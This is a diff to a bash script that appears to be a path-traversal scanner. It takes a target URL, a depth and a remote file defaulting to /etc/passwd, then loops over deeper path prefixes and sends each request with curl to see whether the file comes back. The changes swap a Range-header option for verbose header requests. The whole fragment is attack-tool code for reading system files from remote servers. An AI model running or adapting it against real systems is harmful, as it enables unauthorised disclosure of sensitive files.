@@ -5,12 +5,13 @@ source _flags.sh
 accept-flag RHOST "-url" STRING "" "target url"
 accept-flag DEPTH "-depth" INT "5" "file path depth"
 accept-flag RFILE "-rfile" STRING "/etc/passwd" "remote file to check"
-accept-flag RRANGE "-range" BOOL "" "use range header"
 accept-flag HELP "-help" BOOL "" "usage info"
-CURLOPT=$(flag-rest "$@" )
-if [ "yes" == "$RRANGE" ]; then
-	CURLOPT="$CURLOPT -H 'Range: bytes=0-4096'"
-fi
+
+CURLOPT=$(
+	flag-rest "$@" && \
+	( echo "-Iv" )
+)
+
 if [ "yes" == "$HELP" ] || [ -z "$RHOST" ]; then
 	usage "... the rest will be passed to curl directly.\nURL parameter is mandatory"
 	exit
@@ -21,7 +22,7 @@ for i in $(seq 1 "$DEPTH"); do
 	[ -z "$prefix" ] && cmd=$RFILE || cmd=${RFILE:1}
 	(
 		REQUEST="${RHOST}/${prefix}${cmd}"
-		res=$( curl -I $CURLOPT "$REQUEST" 2>/dev/null )
+		res=$( curl $CURLOPT "$REQUEST" 2>/dev/null)
 		if [ -z "$res" ]; then
 			echo "Error requesting $RHOST (${REQUEST})"
 			exit 1
